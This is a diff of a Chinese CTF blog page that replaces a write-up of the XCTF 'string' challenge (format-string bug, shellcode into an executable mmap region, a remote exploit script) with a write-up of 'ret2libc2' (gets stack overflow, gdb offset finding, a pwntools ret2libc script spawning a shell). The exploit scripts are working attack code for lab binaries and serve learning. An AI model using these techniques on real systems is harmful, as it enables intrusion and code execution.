@@ -4,10 +4,10 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="XCTF-string, Matrix">
-    <meta name="description" content="1：checksechunter@hunter:~/PWN/XCTF/xctf_easy$ checksec string
-[*] &amp;#39;/home/hunter/PWN/XCTF/xctf_easy/string&amp;#39;
-    A">
+    <meta name="keywords" content="wiki-ret2libc2, Matrix">
+    <meta name="description" content="1：checksechunter@hunter:~/PWN/wiki/overflow$ checksec ret2libc2
+[*] &amp;#39;/home/hunter/PWN/wiki/overflow/ret2libc2&amp;#39;
+ ">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -15,7 +15,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>XCTF-string | Matrix</title>
+    <title>wiki-ret2libc2 | Matrix</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -280,13 +280,13 @@
 
 
 
-<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/17.jpg')">
+<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/14.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        XCTF-string
+                        wiki-ret2libc2
                     </div>
                 </div>
             </div>
@@ -378,8 +378,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/xctf-pwn-easy/" target="_blank">
-                                <span class="chip bg-color">xctf-pwn-easy</span>
+                            <a href="/tags/wiki-pwn/" target="_blank">
+                                <span class="chip bg-color">wiki--pwn</span>
                             </a>
                         
                     </div>
@@ -393,21 +393,21 @@
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-07-04
+                    2020-07-06
                 </div>
 
                 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        2.4k
+                        720
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        10 分
+                        3 分
                     </div>
                     
                 
@@ -423,292 +423,81 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="1：checksec"><a href="#1：checksec" class="headerlink" title="1：checksec"></a>1：checksec</h2><pre><code>hunter@hunter:~/PWN/XCTF/xctf_easy$ checksec string
-[*] &#39;/home/hunter/PWN/XCTF/xctf_easy/string&#39;
-    Arch:     amd64-64-little
-    RELRO:    Full RELRO
-    Stack:    Canary found
+                <h2 id="1：checksec"><a href="#1：checksec" class="headerlink" title="1：checksec"></a>1：checksec</h2><pre><code>hunter@hunter:~/PWN/wiki/overflow$ checksec ret2libc2
+[*] &#39;/home/hunter/PWN/wiki/overflow/ret2libc2&#39;
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
     NX:       NX enabled
-    PIE:      No PIE (0x400000)</code></pre><p>保护全开有点狠，但是不用慌，这应该告诉我们栈溢出控制程序是不可能的了</p>
-<h2 id="2：IDA"><a href="#2：IDA" class="headerlink" title="2：IDA"></a>2：IDA</h2><p>程序比较大，下面是进行拆分排序后的函数组合</p>
-<pre><code>main：
-__int64 __fastcall main(__int64 a1, char **a2, char **a3)
+    PIE:      No PIE (0x8048000)</code></pre><p>又是只有NX开启的常规操作</p>
+<h2 id="2：IDA"><a href="#2：IDA" class="headerlink" title="2：IDA"></a>2：IDA</h2><pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
 {
-  _DWORD *v3; // rax
-  __int64 v4; // ST18_8
+  char s; // [esp+1Ch] [ebp-64h]
 
-  setbuf(stdout, 0LL);
-  alarm(60u);
-  sub_400996();                                 // 菜单输出，不用在意
-  v3 = malloc(8uLL);                            // 开辟内存空间
-  v4 = (__int64)v3;
-  *v3 = 68;
-  v3[1] = 85;
-  puts(&quot;we are wizard, we will give you hand, you can not defeat dragon by yourself ...&quot;);
-  puts(&quot;we will tell you two secret ...&quot;);
-  printf(&quot;secret[0] is %x\n&quot;, v4, a2);          // 将输出第一个和第二个元素的地址
-                                                // 
-  printf(&quot;secret[1] is %x\n&quot;, v4 + 4);
-  puts(&quot;do not tell anyone &quot;);
-  sub_400D72(v4);                               // 将开辟内存空间传入该函数
-  puts(&quot;The End.....Really?&quot;);
-  return 0LL;
-}
-
-
-sub_400D72函数：
-// a1是前面开辟内存空间的地址
-unsigned __int64 __fastcall sub_400D72(__int64 a1)
-{
-  char s; // [rsp+10h] [rbp-20h]
-  unsigned __int64 v3; // [rsp+28h] [rbp-8h]
-
-  v3 = __readfsqword(40u);
-  puts(&quot;What should your character&#39;s name be:&quot;);
-  _isoc99_scanf((__int64)&quot;%s&quot;, (__int64)&amp;s);
-  if ( strlen(&amp;s) &lt;= 12 )
-  {
-    puts(&quot;Creating a new player.&quot;);
-    sub_400A7D();                               // 只能输入east
-    sub_400BB9();                               // 格式化字符串漏洞
-    sub_400CA6((_DWORD *)a1);                   // 映射一个大小为4096字节的空间 该空间由读写执行权 传入了开辟空间的地址a1
-  }
-  else
-  {
-    puts(&quot;Hei! What&#39;s up!&quot;);
-  }
-  return __readfsqword(0x28u) ^ v3;
-}
-
-sub_400A7D函数：执行后我们能且只能输入east，没多大用
-
-
-sub_400BB9函数：
-unsigned __int64 sub_400BB9()
-{
-  int v1; // [rsp+4h] [rbp-7Ch]
-  __int64 v2; // [rsp+8h] [rbp-78h]
-  char format; // [rsp+10h] [rbp-70h]
-  unsigned __int64 v4; // [rsp+78h] [rbp-8h]
-
-  v4 = __readfsqword(0x28u);
-  v2 = 0LL;
-  puts(&quot;You travel a short distance east.That&#39;s odd, anyone disappear suddenly&quot;);
-  puts(&quot;, what happend?! You just travel , and find another hole&quot;);
-  puts(&quot;You recall, a big black hole will suckk you into it! Know what should you do?&quot;);
-  puts(&quot;go into there(1), or leave(0)?:&quot;);
-  _isoc99_scanf((__int64)&quot;%d&quot;, (__int64)&amp;v1);
-  if ( v1 == 1 )
-  {
-    puts(&quot;A voice heard in your mind&quot;);
-    puts(&quot;&#39;Give me an address&#39;&quot;);
-    _isoc99_scanf((__int64)&quot;%ld&quot;, (__int64)&amp;v2);
-    puts(&quot;And, you wish is:&quot;);
-    _isoc99_scanf((__int64)&quot;%s&quot;, (__int64)&amp;format);
-    puts(&quot;Your wish is&quot;);
-    printf(&amp;format, &amp;format);                   // 格式化字符串漏洞
-                                                // 
-    puts(&quot;I hear it, I hear it....&quot;);
-  }
-  return __readfsqword(0x28u) ^ v4;
-}
-
-
-
-sub_400CA6((_DWORD *)a1)函数：
-unsigned __int64 __fastcall sub_400CA6(_DWORD *a1)
-{
-  void *v1; // rsi
-  unsigned __int64 v3; // [rsp+18h] [rbp-8h]
-
-  v3 = __readfsqword(40u);
-  puts(&quot;Ahu!!!!!!!!!!!!!!!!A Dragon has appeared!!&quot;);
-  puts(&quot;Dragon say: HaHa! you were supposed to have a normal&quot;);
-  puts(&quot;RPG game, but I have changed it! you have no weapon and &quot;);
-  puts(&quot;skill! you could not defeat me !&quot;);
-  puts(&quot;That&#39;s sound terrible! you meet final boss!but you level is ONE!&quot;);
-  if ( *a1 == a1[1] )                           // 第一个元素等于第二个元素，这两个元素地址是相邻的
-  {
-    puts(&quot;Wizard: I will help you! USE YOU SPELL&quot;);
-    v1 = mmap(0LL, 4096uLL, 7, 33, -1, 0LL);    // 映射一个大小为4096字节的空间 该空间有读写执行权
-    read(0, v1, 256uLL);
-    ((void (__fastcall *)(_QWORD, void *))v1)(0LL, v1);  //这里比较难理解
-  }
-  return __readfsqword(0x28u) ^ v3;
-}</code></pre><h2 id="3：解决疑难语句"><a href="#3：解决疑难语句" class="headerlink" title="3：解决疑难语句"></a>3：解决疑难语句</h2><p><strong>对于((void (__fastcall *)(_QWORD, void *))v1)(0LL, v1);这条语句我查了半天也没怎么理解，也就是说这个伪代码看不懂。在这种时候千万别忘了我们还可以看反汇编内容！！这一块区域的反汇编：</strong></p>
-<pre><code>mov     edi, offset aWizardIWillHel ; &quot;Wizard: I will help you! USE YOU SPELL&quot;   
-call    puts
-mov     r9d, 0          ; offset
-mov     r8d, 0FFFFFFFFh ; fd
-mov     ecx, 33         ; flags
-mov     edx, 7          ; prot
-mov     esi, 4096       ; len
-mov     edi, 0          ; addr
-call    mmap
-mov     [rbp+buf], rax
-mov     rax, [rbp+buf]
-mov     edx, 256        ; nbytes
-mov     rsi, rax        ; buf
-mov     edi, 0          ; fd
-call    read
-mov     rax, [rbp+buf]
-mov     edi, 0
-call    rax</code></pre><p><strong>1-2：显然是对应：puts(“Wizard: I will help you! USE YOU SPELL”);这条语句，执行了这一条就能说明程序进入了if语句</strong><br><strong>3-9：是执行了mmap函数，先是将该函数的参数从右到左传入寄存器和一些特别的地方，最后进行调用mmap函数</strong><br><strong>10-15：主要是执行read函数，但我们可以发现这一段除了将传read函数的参数，还进行了其他操作。即第10第11条，将rax的值赋给[rbp+buf]代表的地址上面，又将[rbp+buf]代表的地址赋给rax。在传buf参数时，是将rax放入rsi，所以这个read函数将会入读数据到rax存放的地址上。结合IDA伪代码，这个地址就是可读可写可执行内存区，即[rbp+buf]所代表的地址。</strong><br><strong>16-18：将[rbp+buf]地址放入rax，17行应该不重要，18行就像调用函数一样直接调用rax。那么我们可以肯定((void (__fastcall *)(_QWORD, void *))v1)(0LL, v1)可以执行程序读入的代码</strong></p>
-<h3 id="探究"><a href="#探究" class="headerlink" title="探究"></a>探究</h3><p>1.main函数主要功能：开辟一个8字节的内存空间，该空间第一个元素大小赋值为68第二个元素大小赋值为85 ，输出两者的地址，然后进入sub_400D72(v4)函数<br>2.sub_400D72(v4)函数主要功能：输入一串字符作为角色名字，然后依次执行sub_400A7D()   sub_400BB9()  sub_400CA6((_DWORD *)a1)函数<br>3：sub_400A7D()函数主要功能：让用户输入test字符串，才能继续执行<br>4：sub_400BB9() 函数主要功能：输入1进入if语句，在该语句中先输入整数，再输入字符串，该字符串和后面的printf构成格式化字符串漏洞<br>5：sub_400CA6((_DWORD *)a1)函数主要功能：输出一堆废话 但是如果main函数中所开辟的空间中的第一个元素等于第二个元素，将映射一个有读写执行权的空间。然后在读取输入到空间中，最后那一串语句盲猜是要执行那段空间里面的数据</p>
-<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p><strong>从main函数中得到两元素地址，在要执行sub_400BB9()函数时利用其包括的格式化字符串漏洞，改两个元素的值使其相等。这样在执行sub_400CA6((_DWORD *)a1)函数时就可以输入shellcode到一个映射空间，由下面的语句执行空间中的shellcode</strong></p>
-<h2 id="4：exp"><a href="#4：exp" class="headerlink" title="4：exp"></a>4：exp</h2><pre><code>from pwn import*
-
-context(arch=&#39;amd64&#39;,os=&#39;linux&#39;)
+  setvbuf(stdout, 0, 2, 0);
+  setvbuf(_bss_start, 0, 1, 0);
+  puts(&quot;Something surprise here, but I don&#39;t think it will work.&quot;);
+  printf(&quot;What do you think ?&quot;);
+  gets(&amp;s);
+  return 0;
+}</code></pre><p><strong>显然gets这里有栈溢出，用IDA检查字符串发现有system函数，但是没有/bin/sh字符串</strong></p>
+<h2 id="3：gdb调试测其溢出点"><a href="#3：gdb调试测其溢出点" class="headerlink" title="3：gdb调试测其溢出点"></a>3：gdb调试测其溢出点</h2><pre><code>[----------------------------------registers-----------------------------------]
+EAX: 0x0 
+EBX: 0x0 
+ECX: 0xf7fb25c0 --&gt; 0xfbad2288 
+EDX: 0xf7fb389c --&gt; 0x0 
+ESI: 0xf7fb2000 --&gt; 0x1d4d6c 
+EDI: 0x0 
+EBP: 0x6941414d (&#39;MAAi&#39;)
+ESP: 0xffffd03c (&quot;AA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;)
+EIP: 0x80486c5 (&lt;main+125&gt;:    ret)
+EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x80486ba &lt;main+114&gt;:    call   0x8048460 &lt;gets@plt&gt;
+   0x80486bf &lt;main+119&gt;:    mov    eax,0x0
+   0x80486c4 &lt;main+124&gt;:    leave  
+=&gt; 0x80486c5 &lt;main+125&gt;:    ret    
+   0x80486c6:    xchg   ax,ax
+   0x80486c8:    xchg   ax,ax
+   0x80486ca:    xchg   ax,ax
+   0x80486cc:    xchg   ax,ax
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd03c (&quot;AA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;)
+0004| 0xffffd040 (&quot;ANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;)
+0008| 0xffffd044 (&quot;jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;)
+0012| 0xffffd048 (&quot;AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;)
+0016| 0xffffd04c (&quot;AkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;)
+0020| 0xffffd050 (&quot;PAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;)
+0024| 0xffffd054 (&quot;AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;)
+0028| 0xffffd058 (&quot;AmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA&quot;)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x080486c5    30    in ret2libc.c
+gdb-peda$ pattern offset AA8A
+AA8A found at offset: 112
+gdb-peda$ </code></pre><p>溢出点为112</p>
+<h2 id="4：思路"><a href="#4：思路" class="headerlink" title="4：思路"></a>4：思路</h2><p><strong>首先因为在程序中可以直接利用system函数，还有栈溢出跳转到system函数，接下来就是想办法得到/bin/sh字符串。</strong><br><strong>一般的如果题目没有给libc文件不老要想着找到libc地址来解题。那么不考虑libc文件中的/bin/sh字符串，我们看能不能利用输入来获得该字符串。</strong><br><strong>仔细看IDA主函数的伪代码会发现有个函数将bss段清零了（当然bss一般本来就是0）这应该就是给我们提示了，利用bss段全局变量来存放我们输入的/bin/sh，这样就可以让system函数利用这个字符串。那么输入函数这里直接有gets函数。ok构造exp</strong></p>
+<h2 id="5：exp"><a href="#5：exp" class="headerlink" title="5：exp"></a>5：exp</h2><pre><code>from pwn import*
 
 context.log_level = &#39;debug&#39;
 
-#sh = process(&#39;./string&#39;)
+elf = ELF(&#39;ret2libc2&#39;)
+system_addr = elf.plt[&#39;system&#39;]
+gets_plt = elf.plt[&#39;gets&#39;]
+bss_addr = 0x0804A040   #bss段的地址都可以在IDA找到
+main = elf.symbols[&#39;main&#39;] 
 
-sh = remote(&quot;220.249.52.133&quot;,32219)
-
-sh.recvuntil(&#39;[0] is &#39;)
-addr1 = int(sh.recvuntil(&#39;\n&#39;), 16)   //获取地址
-sh.recvuntil(&#39;[1] is &#39;)
-addr2 = int(sh.recvuntil(&#39;\n&#39;),16)    //获取地址
-
-print addr1
-print addr2
-print type(addr1)
+sh = process(&#39;./ret2libc2&#39;)
 
 sh.recv()
 
-payload1 = &#39;HUNTER&#39;
-sh.sendline(payload1)
-
-sh.recv()
-
-payload2 = &#39;east&#39;
-sh.sendline(payload2)
-
-sh.recv()
-
-sh.sendline(&#39;1&#39;)
-
-sh.recv()
-
-sh.sendline(&#39;123&#39;)
-
-sh.recv()
-#formal bug
-payload3 = &quot;AAA%082d&quot; + &quot;%10$nAAA&quot; + p64(addr1)  #构造格式化字符串payload时要注意参数位置，以及对应程序操作位数
-
+payload = &quot;A&quot;*112 + p32(gets_plt) + p32(system_addr) + p32(bss_addr) + p32(bss_addr) 
 
 #gdb.attach(sh)
-sh.sendline(payload3)
 
-sh.recv()
+sh.sendline(payload)
 
-#input shell
-&#39;&#39;&#39;
-payload4 = &quot;&quot;
-payload4 += &quot;\x01\x30\x8f\xe2&quot;
-payload4 += &quot;\x13\xff\x2f\xe1&quot;
-payload4 += &quot;\x78\x46\x0e\x30&quot;
-payload4 += &quot;\x01\x90\x49\x1a&quot;
-payload4 += &quot;\x92\x1a\x08\x27&quot;
-payload4 += &quot;\xc2\x51\x03\x37&quot;
-payload4 += &quot;\x01\xdf\x2f\x62&quot;
-payload4 += &quot;\x69\x6e\x2f\x2f&quot;
-payload4 += &quot;\x73\x68&quot;
-&#39;&#39;&#39;
-
-payload4 = asm(shellcraft.sh())
-sh.sendline(payload4)
-
-sh.interactive()</code></pre><h2 id="5：知识点"><a href="#5：知识点" class="headerlink" title="5：知识点"></a>5：知识点</h2><p>mmap函数 </p>
-<blockquote>
-<p>mmap函数是unix/linux下的系统调用。<br>当存在客户－服务程序中复制文件时候，其数据流如下，要经历四次数据复制，开销很大。<br><img src="https://s1.ax1x.com/2020/07/04/NzLPjU.png" alt=""><br>如果采用共享内存的方式，那么将大大优化IO操作，数据流变成了如下，数据只复制两次：<br><img src="https://s1.ax1x.com/2020/07/04/NzLCcT.png" alt=""><br>映射文件或设备到内存中，取消映射就是munmap函数。<br>语法如下：</p>
-</blockquote>
-<blockquote>
-<p>void mmap(void addr, size_t length, int prot, int flags, int fd, off_t offset);</p>
-</blockquote>
-<blockquote>
-<p>int munmap(void *addr, size_t length);<br>该函数主要用途有三个：</p>
-</blockquote>
-<blockquote>
-<p>1、将普通文件映射到内存中，通常在需要对文件进行频繁读写时使用，用内存读写取代I/O读写，以获得较高的性能；</p>
-</blockquote>
-<blockquote>
-<p>2、将特殊文件进行匿名内存映射，为关联进程提供共享内存空间；</p>
-</blockquote>
-<blockquote>
-<p>3、为无关联的进程间的Posix共享内存（SystemV的共享内存操作是shmget/shmat）</p>
-</blockquote>
-<blockquote>
-<p>我们来看下函数的入参选择：</p>
-</blockquote>
-<blockquote>
-<p>1、参数addr：</p>
-</blockquote>
-<blockquote>
-<p>指向欲映射的内存起始地址，通常设为 NULL，代表让系统自动选定地址，映射成功后返回该地址。</p>
-</blockquote>
-<blockquote>
-<p>2、参数length：</p>
-</blockquote>
-<blockquote>
-<p>代表将文件中多大的部分映射到内存。</p>
-</blockquote>
-<blockquote>
-<p>3、参数prot：</p>
-</blockquote>
-<blockquote>
-<p>映射区域的保护方式。可以为以下几种方式的组合：</p>
-</blockquote>
-<blockquote>
-<p>PROT_EXEC 映射区域可被执行</p>
-</blockquote>
-<blockquote>
-<p>PROT_READ 映射区域可被读取</p>
-</blockquote>
-<blockquote>
-<p>PROT_WRITE 映射区域可被写入</p>
-</blockquote>
-<blockquote>
-<p>PROT_NONE 映射区域不能存取</p>
-</blockquote>
-<blockquote>
-<p>4、参数flags：</p>
-</blockquote>
-<blockquote>
-<p>影响映射区域的各种特性。在调用mmap()时必须要指定MAP_SHARED 或MAP_PRIVATE。</p>
-</blockquote>
-<blockquote>
-<p>MAP_FIXED 如果参数start所指的地址无法成功建立映射时，则放弃映射，不对地址做修正。通常不鼓励用此。</p>
-</blockquote>
-<blockquote>
-<p>MAP_SHARED对映射区域的写入数据会复制回文件内，而且允许其他映射该文件的进程共享。</p>
-</blockquote>
-<blockquote>
-<p>MAP_PRIVATE 对映射区域的写入操作会产生一个映射文件的复制，即私人的“写入时复制”（copy on write）对此区域作的任何修改都不会写回原来的文件内容。</p>
-</blockquote>
-<blockquote>
-<p>MAP_ANONYMOUS建立匿名映射。此时会忽略参数fd，不涉及文件，而且映射区域无法和其他进程共享。</p>
-</blockquote>
-<blockquote>
-<p>MAP_DENYWRITE只允许对映射区域的写入操作，其他对文件直接写入的操作将会被拒绝。</p>
-</blockquote>
-<blockquote>
-<p>MAP_LOCKED 将映射区域锁定住，这表示该区域不会被置换（swap）。</p>
-</blockquote>
-<blockquote>
-<p>5、参数fd：</p>
-</blockquote>
-<blockquote>
-<p>要映射到内存中的文件描述符。如果使用匿名内存映射时，即flags中设置了MAP_ANONYMOUS，fd设为-1。</p>
-</blockquote>
-<blockquote>
-<p>6、参数offset：</p>
-</blockquote>
-<blockquote>
-<p>文件映射的偏移量，通常设置为0，代表从文件最前方开始对应，offset必须是分页大小的整数倍。如下图内存映射文件的示例。<br><img src="https://s1.ax1x.com/2020/07/04/NzLFuF.png" alt=""></p>
-</blockquote>
-<p>原文：<a href="https://segmentfault.com/a/1190000014616732" target="_blank" rel="noopener">https://segmentfault.com/a/1190000014616732</a></p>
+sh.interactive()</code></pre><h3 id="易错点"><a href="#易错点" class="headerlink" title="易错点"></a>易错点</h3><p>之前我一直认为这个payload=payload = “A”<em>112 + p32(gets_plt) + p32(system_addr) + p32(bss_addr) + p32(system_ret) + p32(bss_addr)是完全没问题的，system_ret即将作为system函数的返回地址。<br>我这么认为是因为，我以为用p32(gets_plt）执行后p32(system_addr)作为返回地址，p32(bss_addr)作为参数：程序将跳转到system函数，<del>而p32(bss_addr)将被gets函数从栈中取出</del> .*</em>后面这个想法大错特错，用gdb调试发现返回地址，和参数一直都在栈中，只是利用参数时会进行值的传递，而不是取出。**<br><img src="https://s1.ax1x.com/2020/07/06/UCWhEq.png" alt="函数调用过程"></p>
 
             </div>
             <hr/>
@@ -849,7 +638,7 @@ sh.interactive()</code></pre><h2 id="5：知识点"><a href="#5：知识点" cla
                     </span>
                     <a href="http://squarepants0.github.io" class="b-link-green">Matrix</a>
                     <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
-                    <a href="/2020/07/04/xctf-string/" class="b-link-green">XCTF-string</a>
+                    <a href="/2020/07/06/wiki-ret2libc2/" class="b-link-green">wiki-ret2libc2</a>
                 </p>
             </div>
         </div>
@@ -870,9 +659,10 @@ sh.interactive()</code></pre><h2 id="5：知识点"><a href="#5：知识点" cla
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2020/07/06/wiki-ret2libc2/">
                     <div class="card-image">
@@ -888,9 +678,9 @@ sh.interactive()</code></pre><h2 id="5：知识点"><a href="#5：知识点" cla
 [*] &#39;/home/hunter/PWN/wiki/overflow/ret2libc2&#39;
  </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-07-06
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-07-06
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-user fa-fw"></i>
@@ -899,6 +689,7 @@ sh.interactive()</code></pre><h2 id="5：知识点"><a href="#5：知识点" cla
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -917,19 +708,19 @@ sh.interactive()</code></pre><h2 id="5：知识点"><a href="#5：知识点" cla
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/07/04/wiki-ret2libc3/">
+                <a href="/2020/07/04/xctf-string/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="wiki--ret2libc3">
+                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="XCTF-string">
                         
-                        <span class="card-title">wiki--ret2libc3</span>
+                        <span class="card-title">XCTF-string</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary">1：checksechunter@hunter:~/PWN/level3$ checksec ret2libc3
-[*] &#39;/home/hunter/PWN/level3/ret2libc3&#39;
-    Arch:     i</div>
+                    <div class="summary">1：checksechunter@hunter:~/PWN/XCTF/xctf_easy$ checksec string
+[*] &#39;/home/hunter/PWN/XCTF/xctf_easy/string&#39;
+    A</div>
                     <div class="publish-info">
                             <span class="publish-date">
                                 <i class="fa fa-clock-o fa-fw icon-date"></i>2020-07-04
@@ -945,8 +736,8 @@ sh.interactive()</code></pre><h2 id="5：知识点"><a href="#5：知识点" cla
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/wiki-pwn/" target="_blank">
-                        <span class="chip bg-color">wiki--pwn</span>
+                    <a href="/tags/xctf-pwn-easy/" target="_blank">
+                        <span class="chip bg-color">xctf-pwn-easy</span>
                     </a>
                     
                 </div>
